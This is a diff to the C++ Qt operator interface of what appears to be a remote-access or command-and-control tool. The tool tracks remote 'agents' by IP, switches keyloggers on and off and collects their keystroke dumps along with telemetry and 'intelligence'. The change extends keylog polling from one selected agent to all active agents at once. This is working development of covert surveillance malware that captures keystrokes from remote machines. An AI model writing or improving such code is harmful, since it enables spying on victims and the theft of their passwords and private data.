@@ -337,19 +337,28 @@ void MainWindow::toggleKeylogState(bool active) {
     QString agentIp = item->data(Qt::UserRole).toString();
     if (active) {
         m_server->toggleKeylogger(agentIp, true);
-        m_keylogPollTimer->start(1500);
+        m_activeKeylogIps.insert(agentIp);
+        if (!m_keylogPollTimer->isActive()) {
+            m_keylogPollTimer->start(1500);
+        }
     } else {
         m_server->toggleKeylogger(agentIp, false);
-        m_keylogPollTimer->stop();
+        m_activeKeylogIps.remove(agentIp);
+        if (m_activeKeylogIps.isEmpty()) {
+            m_keylogPollTimer->stop();
+        }
     }
 }
 
 void MainWindow::pollKeylogger() {
-    QListWidgetItem* item = m_agentList->currentItem();
-    if (!item) return;
+    if (m_activeKeylogIps.isEmpty()) {
+        m_keylogPollTimer->stop();
+        return;
+    }
     
-    QString agentIp = item->data(Qt::UserRole).toString();
-    m_server->requestKeylogDump(agentIp);
+    for (const QString& agentIp : m_activeKeylogIps) {
+        m_server->requestKeylogDump(agentIp);
+    }
 }
 
 void MainWindow::showAgentContextMenu(const QPoint& pos) {
@@ -410,6 +419,9 @@ void MainWindow::handleAgentSelectionChanged() {
     m_telemetryPanel->loadHistory(uuid);
     m_keylogPanel->loadHistory(uuid);
     m_intelligencePanel->loadIntelligenceList(uuid);
+    
+    // Update keylogger eye button state for the selected agent
+    m_keylogPanel->setKeylogButtonChecked(m_activeKeylogIps.contains(ip));
 }
 
 void MainWindow::handleIntelligenceUpdated(const QString& uuid) {
